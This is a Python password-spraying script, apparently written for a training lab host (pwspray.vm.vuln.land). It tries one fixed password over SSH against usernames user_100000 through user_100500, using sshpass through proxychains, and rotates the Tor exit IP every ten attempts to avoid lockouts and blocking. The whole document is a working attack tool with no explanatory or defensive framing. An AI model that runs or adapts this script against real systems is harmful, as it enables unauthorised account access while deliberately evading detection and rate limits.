
import time
import os
from stem import Signal
from stem.control import Controller

attempts = 10
user = {
    'prefix': 'user_',
    'min': 100000,
    'max': 100500
}
target = 'pwspray.vm.vuln.land'
target_ip = '152.96.6.197'
target_port = '22'
password = '51292114'

def renew_tor_ip():
    with Controller.from_port(port=9051) as controller:
        controller.authenticate(password="secret")
        controller.signal(Signal.NEWNYM)
        print('New IP')
        time.sleep(5)


counter = 1
renew_tor_ip()
for i in range(user.get('min'), user.get('max') + 1):
    if counter == attempts:
        renew_tor_ip()
        counter = 0
    username = user.get('prefix') + str(i)
    print('Try: ' + username)
    command = 'proxychains sshpass -p ' + password + ' ssh -o StrictHostKeyChecking=no ' + username + '@' + target_ip + ' -p ' + target_port
    exitcode = os.system(command)
    if exitcode == 0:
        print('success: ' + username)
        exit()
    else:
        print('failed' + str(exitcode))
    counter += 1
